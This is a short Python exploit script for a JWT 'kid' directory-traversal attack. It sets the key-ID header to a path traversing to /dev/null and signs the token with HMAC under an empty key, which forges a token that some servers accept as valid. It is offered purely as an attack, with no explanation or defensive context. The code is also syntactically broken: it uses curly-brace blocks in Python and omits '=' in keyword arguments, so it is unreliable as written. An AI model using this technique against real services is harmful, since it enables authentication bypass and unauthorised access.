#Kid Directory Traversal
import hmac
import base64
import hashlib
import json
from sys import version_info

#decode the header & Payload in LInux
#make Kid Null
header={"":"","kid":"../../../../../../../../../dev/null"}
key=""
payload={"name":"value"}

if version_info[0] == 2:
{
str=base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")
sign=base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf-8').rstrip("=")
}
else{
str=base64.urlsafe_b64encode(bytes(json.dumps(header),encoding'utf-8')).decode('utf-8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding'utf-8')).decode('utf-8').rstrip("=")
sign=base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf-8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('utf-8').rstrip("=")
}

print(str +"."+sign)
